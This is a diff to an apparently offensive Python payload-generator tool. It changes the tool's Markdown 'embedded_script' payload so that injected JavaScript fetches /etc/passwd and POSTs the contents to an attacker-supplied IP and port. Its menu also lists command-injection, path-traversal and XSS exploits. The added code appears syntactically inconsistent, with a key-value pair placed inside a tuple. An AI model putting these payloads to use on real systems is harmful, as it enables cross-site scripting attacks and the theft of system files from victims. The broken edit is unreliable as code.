@@ -86,7 +86,18 @@ def get_payload(extension, ip, port):
                 # Markdown payload with an embedded script for data exfiltration
                 # This uses JavaScript's `fetch` API to send document content to the attacker's server.
                 # Useful for testing XSS and data exfiltration vulnerabilities.
-                f"<script>\nfetch('http://{ip}:{port}/', {{\n  method: 'POST',\n  body: JSON.stringify({{data: document.body.innerText}}),\n}});\n</script>"
+                # By default attempts to get the /etc/passwd file - can be changed using nano
+                "embedded_script": (
+                    f"<script>\nfetch('/etc/passwd')\n"
+                    f"  .then(response => response.text())\n"
+                    f"  .then(data => {{\n"
+                    f"    fetch('http://{ip}:{port}/', {{\n"
+                    f"      method: 'POST',\n"
+                    f"      body: JSON.stringify({{ fileContents: data }})\n"
+                    f"    }});\n"
+                    f"  }})\n"
+                    f"  .catch(error => console.error('Error fetching /etc/passwd:', error));\n</script>"
+                )
             )
         },
         ".sh": (
@@ -145,7 +156,7 @@ def generate_payload():
             "code_injection": "(Command injection via a code block, requires user execution)",
             "file_inclusion": "(Local file inclusion using path traversal)",
             "javascript_link": "(XSS through a JavaScript link, requires user interaction)",
-            "embedded_script": "(This uses JavaScript's `fetch` API to send document content to the attacker's server.)"
+            "embedded_script": "(This uses JavaScript's `fetch` API to send document content to the attacker's server. (By default it is /etc/passwd))"
         }
         print("[!] Available Markdown Exploits:")
         for i, (md_type, description) in enumerate(md_exploit_types.items(), 1):
